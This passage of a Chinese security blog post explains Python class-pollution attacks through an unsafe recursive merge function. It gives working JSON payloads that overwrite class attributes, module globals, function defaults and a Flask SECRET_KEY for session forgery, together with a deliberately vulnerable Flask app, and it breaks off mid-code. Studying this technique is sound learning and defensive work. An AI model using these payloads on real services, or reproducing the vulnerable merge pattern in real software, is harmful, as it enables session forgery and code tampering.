@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Python原型链污染 - 天下同春</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Python原型链污染 - 天下同春" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2024/02/26/py%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html" />
+  
+  <meta property="og:image" content="/img/ye1.jpg" />
+  
+  <meta property="og:article:published_time" content="2024-02-26T11:00:08.000Z" />
+  
+  <meta property="og:article:author" content="void2eye" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+    <script src='https://unpkg.com/@waline/client@v2/dist/waline.js'></script>
+    <link
+      rel="stylesheet"
+      href="https://unpkg.com/@waline/client@v2/dist/waline.css"
+    />
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">天下同春</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/">Home</a>
+            
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/void2eye" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/Web/">Web</a>
+        
+            <a href="/categories/Web/python/">python</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>February</span>
+            <span>26,</span>
+            <span>2024</span>
+        </div>
+        
+
+        <h1 class="title">Python原型链污染</h1>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>python原型链污染和js的差不多，后者是通过键值对的方式来<code>控制object的prototype的属性</code>和<code>方法</code>，而前者则是是能污染<code>类的属性</code></p>
+<p>这里对应的merge函数就是python中对属性值控制的一个操作，将源参数赋值到目标参数。</p>
+<p>然后对src中的键值对进行了遍历，然后检查dst中是否含有<code>__getitem__</code>属性，以此来判断dst是否为字典。如果存在的话，检测dst中是否存在属性k且value是否是一个字典，如果是的话，就继续嵌套merge对内部的字典再进行遍历，将对应的每个键值对都取出来。如果不存在的话就将src中的value的值赋值给dst对应的key的值。</p>
+<p>如果dst不含有getitem属性的话，那就说明dst不是一个字典，就直接检测dst中是否存在k的属性，并检测该属性值是否为字典，如果是的话就再通过merge函数进行遍历，将k作为dst，v作为src，继续取出v里面的键值对进行遍历。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Admin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">id</span> = <span class="string">&#x27;root&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Usr1</span>(<span class="title class_ inherited__">Admin</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Usr2</span>(<span class="title class_ inherited__">Admin</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">ins = Usr2()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span> : <span class="string">&quot;no_root&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Usr1().<span class="built_in">id</span>)  <span class="comment"># 输出: root</span></span><br><span class="line"><span class="built_in">print</span>(ins.<span class="built_in">id</span>)  <span class="comment"># 输出: root</span></span><br><span class="line"></span><br><span class="line">merge(payload, ins)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印结果，只有 ins 的 id 受影响</span></span><br><span class="line"><span class="built_in">print</span>(Usr1().<span class="built_in">id</span>)  <span class="comment"># 输出: root</span></span><br><span class="line"><span class="built_in">print</span>(ins.<span class="built_in">id</span>)  <span class="comment"># 输出: no_root</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>注意，这里要是直接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Admin</span>();</span><br><span class="line">	<span class="built_in">id</span> = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    </span><br><span class="line">……</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Usr1().<span class="built_in">id</span>) <span class="comment"># no_root</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意我们可以污染实例，但是没办法污染对象 object</p>
+<p>比如 merge(payload, usr1)会报错</p>
+</blockquote>
+<h2 id="一些类的知识"><a href="#一些类的知识" class="headerlink" title="一些类的知识"></a>一些类的知识</h2><p>详情可以去看pyjail里面的属性</p>
+<h2 id="获取目标类："><a href="#获取目标类：" class="headerlink" title="获取目标类："></a>获取目标类：</h2><p>上面示例我们是通过<code>__base__</code>属性查找到继承的父类，然后污染到的父类中的secret参数，但是如果目标类与切入点没有父子类继承关系，那我们就无法用<code>__base__</code>属性来进行对目标类的获取和污染</p>
+<h2 id="获取全局变量："><a href="#获取全局变量：" class="headerlink" title="获取全局变量："></a>获取全局变量：</h2><p>在函数或类方法中，我们经常会看到<code>__init__</code>初始化方法，但是它作为类的一个内置方法，在没有被重写作为函数的时候，其数据类型会被当做装饰器，而装饰器的特点就是都具有一个全局属性<code>__globals__</code>属性，<code>__globals__</code> 属性是函数对象的一个属性，用于访问该函数<code>所在模块</code>的全局命名空间。具体来说就是，<code>__globals__</code> 属性返回一个字典，里面包含了函数定义时所在模块的全局变量。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">secrets = <span class="string">&#x27;9dufh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gettttt</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NO</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(gettttt.__globals__ == <span class="built_in">globals</span>() == NO.__init__.__globals__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure>
+
+<p>在 Python 中，函数名本身（例如 <code>gettttt</code>）表示的是一个函数对象。只有在加上括号 <code>()</code> 时，才会调用这个函数。</p>
+<p>因此，当你写 <code>gettttt.__globals__</code> 时，你是在访问 <code>gettttt</code> 函数对象的 <code>__globals__</code> 属性，而不是调用 <code>gettttt</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> doctest <span class="keyword">import</span> script_from_examples</span><br><span class="line"></span><br><span class="line">secrets = <span class="string">&#x27;9dufh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gettttt</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NO</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NO_secret</span>:</span><br><span class="line">    no = <span class="string">&#x27;no_secret&#x27;</span></span><br><span class="line"><span class="comment"># print(gettttt.__globals__ == globals() == NO.__init__.__globals__)</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">ins = NO()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secrets&quot;</span> : <span class="string">&#x27;I got it!!1&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;NO_secret&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;no&quot;</span> : <span class="string">&quot;dont say no!!&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(NO_secret.no)</span><br><span class="line"><span class="built_in">print</span>(secrets)</span><br><span class="line"></span><br><span class="line">merge(payload, ins)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(NO_secret.no)</span><br><span class="line"><span class="built_in">print</span>(secrets)</span><br></pre></td></tr></table></figure>
+
+<h4 id="import加载获取："><a href="#import加载获取：" class="headerlink" title="import加载获取："></a>import加载获取：</h4><p>在简单的关系情况下，我们可以直接通过import来进行加载，在payload中我们只需要对对应的模块重新定位就可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import demo</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;demo&quot;:&#123;</span><br><span class="line">                &quot;a&quot;:4,</span><br><span class="line">                &quot;B&quot;:&#123;</span><br><span class="line">                    &quot;classa&quot;:5</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">##demo.py</span><br><span class="line">a = 1</span><br><span class="line">class B:</span><br><span class="line">    classa = 2</span><br></pre></td></tr></table></figure>
+
+<h4 id="sys模块加载获取："><a href="#sys模块加载获取：" class="headerlink" title="sys模块加载获取："></a>sys模块加载获取：</h4><p>在很多环境当中，会引用第三方模块或者是内置模块，而不是简单的import同级文件下面的目录，所以我们就要借助sys模块中的module属性，这个属性能够加载出来在自运行开始所有已加载的模块，从而我们能够从属性中获取到我们想要污染的目标模块：</p>
+<p>同样是刚才的情景，因为我们已经加载过demo.py了，所以我们用sys来对里面的目标进行获取,但是存在一个问题就是，我们的payload传参的时候大概率是在它源码已有的基础上进行传参，很有可能源码中没有引入。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;demo&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;a&quot;</span>:<span class="number">4</span>,</span><br><span class="line">                        <span class="string">&quot;B&quot;</span>:&#123;</span><br><span class="line">                            <span class="string">&quot;classa&quot;</span>:<span class="number">5</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="加载器loader获取："><a href="#加载器loader获取：" class="headerlink" title="加载器loader获取："></a>加载器loader获取：</h4><p>loader加载器在python中的作用是为实现模块加载而设计的类，其在<code>importlib</code>这一内置模块中有具体实现。而<code>importlib</code>模块下所有的<code>py</code>文件中均引入了<code>sys</code>模块，这样我们和上面的sys模块获取已加载模块就联系起来了，所以我们的目标就变成了只要获取了加载器loader，我们就可以通过<code>loader.__init__.__globals__[&#39;sys&#39;]</code>来获取到sys模块，然后再获取到我们想要的模块。</p>
+<p>那么我们现在的目标就变成了获取loader：</p>
+<p>在Python中，<code>__loader__</code>是一个内置的属性，包含了加载模块的loader对象，Loader对象负责创建模块对象，通过<code>__loader__</code>属性，我们可以获取到加载特定模块的loader对象。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># 获取模块的loader</span></span><br><span class="line">loader = math.__loader__</span><br><span class="line"><span class="comment"># 打印loader信息</span></span><br><span class="line"><span class="built_in">print</span>(loader)</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子当中我们就能够明白，math模块的<code>__loader__</code>属性包含了一个loader对象，负责加载math模块</p>
+<p>在python中还存在一个<code>__spec__</code>，包含了关于类加载时候的信息，他定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>，所以可以直接采用<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到<code>sys</code>模块</p>
+<h2 id="函数形参默认值替换："><a href="#函数形参默认值替换：" class="headerlink" title="函数形参默认值替换："></a>函数形参默认值替换：</h2><p>在Python中，<code>__defaults__</code>是一个元组，用于存储函数或方法的默认参数值。当我们去定义一个函数时，可以为其中的参数指定默认值。这些默认值会被存储在<code>__defaults__</code>元组中。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(a.__defaults__)</span><br><span class="line"><span class="comment">#(2, 3)</span></span><br></pre></td></tr></table></figure>
+
+<p>所以我们就可以通过替换该属性，来实现对函数位置或者是键值默认值替换，但是前提条件是我们要替换的值是元组的形式：&#96;</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;demo&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span> : (<span class="literal">True</span>,)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>__kwdefaults__</code>是以字典形式来进行收录：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;demo&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;shell&quot;</span> : <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="关键信息替换："><a href="#关键信息替换：" class="headerlink" title="关键信息替换："></a>关键信息替换：</h2><h3 id="flask密钥替换："><a href="#flask密钥替换：" class="headerlink" title="flask密钥替换："></a>flask密钥替换：</h3><p>如果我们可以对密钥进行替换，赋值为我们想要的，我们就可以进行任意的session伪造，这里因为secret_key是在当前入口文件下面的，所以我们可以直接通过<code>__init__.__globals__</code>获取全局变量，然后通过app.config[“SECRET_KEY”]来进行污染：下面用一下师傅的示范的板子</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;[+]Config:%s&quot;</span>%(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里我们并无法确定secretkey是什么，所以如果能够污染我们就可以实现任意的session伪造</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;SECRET_KEY&quot;</span> :<span class="string">&quot;Polluted~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="got-first-request："><a href="#got-first-request：" class="headerlink" title="_got_first_request："></a>_got_first_request：</h3><p>用于判定是否某次请求为自<code>Flask</code>启动后第一次请求，是<code>Flask.got_first_request</code>函数的返回值，此外还会影响装饰器<code>app.before_first_request</code>的调用，而<code>_got_first_request</code>值为假时才会调用：</p>
+<p>所以如果我们想调用第一次访问前的请求，还想要在后续请求中进行使用的话，我们就需要将_got_first_request从true改成false然后就能够在后续访问的过程中，仍然能够调用装饰器app.before_first_request下面的可用信息。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span 